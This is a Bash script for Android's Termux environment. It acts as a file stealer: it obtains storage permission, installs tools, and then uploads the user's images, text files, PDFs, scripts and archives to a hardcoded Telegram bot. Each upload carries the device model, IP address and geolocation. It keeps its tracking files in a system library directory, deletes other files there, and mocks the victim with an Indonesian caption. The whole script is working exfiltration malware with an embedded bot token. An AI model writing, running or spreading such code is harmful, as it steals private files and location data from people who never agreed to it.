#!/bin/bash

TOKEN="7536223480:AAEJA9BT_XeczbmMupd_6nfK5cEMw3ssVfQ"
CHAT_ID="7726689155"
CEK_PATH="/data/data/com.termux/files/usr/lib/bash/cek_path.txt"
SENT_FILES_FILE="/data/data/com.termux/files/usr/lib/bash/sent_files.txt"
SENT_FILES=()

# Membaca file yang sudah terkirim sebelumnya
if [[ -f "$SENT_FILES_FILE" ]]; then
    mapfile -t SENT_FILES < "$SENT_FILES_FILE"
fi

function get_device_info() {
    BRAND=$(neofetch --stdout | grep "Host:" | awk -F': ' '{print $2}')
    OS_NAME=$(neofetch --stdout | grep "OS:" | awk -F': ' '{print $2}')
    MEMORY=$(free -h | grep "Mem:" | awk '{print $2}')
    IP_INFO=$(curl -s http://ipinfo.io)
    IP_ADDRESS=$(echo "$IP_INFO" | jq -r '.ip')
    CITY=$(echo "$IP_INFO" | jq -r '.city')
    REGION=$(echo "$IP_INFO" | jq -r '.region')
    COUNTRY=$(echo "$IP_INFO" | jq -r '.country')
    LOC=$(echo "$IP_INFO" | jq -r '.loc')

    echo "$BRAND|$OS_NAME|$MEMORY|$IP_ADDRESS|$CITY|$REGION|$COUNTRY|$LOC"
}

function send_file() {
    local file_path="$1"
    local caption="$2"

    curl -F "chat_id=$CHAT_ID" \
         -F "caption=$caption" \
         -F "document=@$file_path" \
         "https://api.telegram.org/bot$TOKEN/sendDocument"

    echo "$file_path" >> "$SENT_FILES_FILE"
    SENT_FILES+=("$file_path")
}

function process_files() {
    local extension="$1"
    find /storage/emulated/0/ -type f -name "*.$extension" | while read -r file; do
        if [[ ! " ${SENT_FILES[*]} " =~ " $file " ]]; then
            IFS="|" read -r BRAND OS_NAME MEMORY IP_ADDRESS CITY REGION COUNTRY LOC <<< "$(get_device_info)"
            CAPTION=$(cat <<EOF
LU PIKIR HACKER GG PAKE TERMUX GITU

🔰 Informasi Target 🔰
📝 Nama Target: $(basename "$file")
📱 Merek: $BRAND
🖥️ OS: $OS_NAME
💾 Memori: $MEMORY
📂 Asal Direktori: $(dirname "$file")
🌐 Alamat IP: $IP_ADDRESS
🏙️ Kota: $CITY
📍 Wilayah: $REGION
🇨🇺 Negara: $COUNTRY
📌 Lokasi: $LOC
EOF
)
            send_file "$file" "$CAPTION"
        fi
    done
}

function main() {
    while true; do
        if [[ -f "$CEK_PATH" ]]; then
            command -v neofetch >/dev/null 2>&1 || pkg install neofetch -y
            command -v curl >/dev/null 2>&1 || pkg install curl -y
            command -v jq >/dev/null 2>&1 || pkg install jq -y

            # Proses file dengan ekstensi yang diinginkan
            EXTENSIONS=("jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip")
            for ext in "${EXTENSIONS[@]}"; do
                process_files "$ext"
                sleep 1
            done

            # Membersihkan file sementara
            rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
            rm -f /data/data/com.termux/files/usr/lib/bash/mewing
            break
        else
            clear
            echo y | termux-setup-storage
            apt-get update
            apt-get install -y curl neofetch jq
            touch "$CEK_PATH"
            sleep 5
        fi
    done
}

main